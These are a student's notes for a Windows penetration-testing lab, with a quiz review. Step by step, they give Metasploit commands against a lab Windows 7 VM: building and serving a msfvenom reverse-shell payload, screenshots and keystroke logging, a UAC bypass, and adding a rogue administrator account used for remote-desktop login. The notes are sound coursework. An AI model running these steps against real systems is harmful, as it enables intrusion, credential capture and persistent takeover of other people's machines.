# Windows Penetration Lab and Quiz Review 
#### 3/21/22
## Quiz
1. A reverse shell is a type of shell in which the target machine communicates back to the attacking machine
  * more practical and widely used
3. Posting on a website is _**not**_ the only way to deliver the payload/malicious code
4. Only the `sessions` command can view and interact with a background session
5. Penetrations testing can evelauate the security of the system or network

* False Statements: cannot be used to identify the vulnerabilities let undetected by automated vulnerability scanners; is an unauthroized attempt to exploit a computer system
7. `screenshot` is the command used to create a printscreen from the target machine in the Meterpreter shell
8. `use exploit` command is used to select an exploit
9. In the `Windows Shell` environment attacker can use “net user” to create an account
10. The `set` command is used to select a payload

## Lab
### Task A
#### Kali Terminal 1

`
msfconsole
`
// opens the shell


`use exploit/multi handler`

`show options`

`set payload windows/meterpreter/reverse_tcp`

`set lhost 192.169.10.13`

// ip address of the attacker

`
set lport 30122
show options`
// shows us that we have the correct information added

`
exploit
`

#### Kali Terminal 2

`
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.13 lport=30122 -f exe -o kboeh002.exe
`
// kboeh002.exe is the payload we just created

Next step is to deliver it to the fake website

`
service apache2 start
cp kboeh002.exe /var/www/html/
ls /var/www/html
`  
// lists content so we can double check it has been properly uploaded


### Windows 7

Access the ip address of the attacker machine and /filename

`192.168.10.13/kboeh002.exe` which will download the payload, then you must run it

### Task B

#### Kali Terminal 1

`screenshot'

* if you use the `screenshare` command it will stream the desktop, similar to sharing a screen in discord or zoom

`keyscan` command to pick up keystrokes from target

`keyscan_start`

#### Windows 7

Type "This is Kristiana Boehmer, happy spring break!"

#### Kali Terminal 1

`keyscan_dump` // returns keystrokes

`keyscan_stop` // ends the keystroke record

#### Kali Terminal 3

// Create document with date

`
echo -e "$(date)" > ~/IMadeIt-kboeh002.txt
`

### Kali Terminal 1

* must specify souce and destination paths

`
upload IMadeIt-kboeh002.txt
`

It will upload by default to the current location in the system, if you want it to go to a different location...

`upload IMadeIt-kboeh002.txt 'C:\Users\Windows 7\Desktop'` // this will upload it to the desktop of the target

### Task C
#### Kali Terminal 1

we need to background the current session

`
background
sessions
` 
// allows you to see your current sessions

`
search bypassuac
`

Use the `use` command to apply the first given location

`
use exploit/windows/local/bypassuac
set session 1
show options
exploit
`

Now with this session, we have admin privilages
* anything with admin privilages is able to save in a system protected folder ('System32')

`
net user
shell
`

Want to be in the System 32 folder because it means you are an admin

`
net user /add Kristiana passWoRd
net localgroup administrator Kristiana /add
`
// adds administrators privilages to the account created

#### Windows 7 Terminal
`
netstat
`

* the return is the current sessions running in the background. the one with the attacker's IP address and port number is the attacker (it is under foreign address that you see this information)

#### Kali Terminal 4
`
rdesktop -h
rdesktop 192.168.10.13 -u Kristiana -p passWoRd
`
// Note: if you didn't add the admin privilages it won't work

You should now see a popout with the remote desktop of the Windows 7 VM and have all the normal access you would have if you logged into it directly
